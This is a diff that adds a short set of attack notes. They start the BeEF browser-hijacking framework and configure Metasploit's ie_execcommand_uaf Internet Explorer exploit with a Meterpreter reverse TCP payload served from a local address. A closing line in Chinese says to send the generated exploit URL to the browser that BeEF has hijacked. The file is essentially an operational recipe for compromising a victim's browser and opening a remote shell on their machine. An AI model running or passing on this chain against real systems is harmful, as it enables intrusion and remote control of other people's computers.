@@ -1,0 +1,12 @@
+cd /usr/share/beef-xss
+./beef-xss
+
+use exploit/windows/browser/ie_execcommand_uaf
+show options
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SRVHOST 192.168.80.136
+set SRVPORT 8888
+set URIPATH /
+exploit
+
+把msf生成的网址给beef劫持的浏览器使用
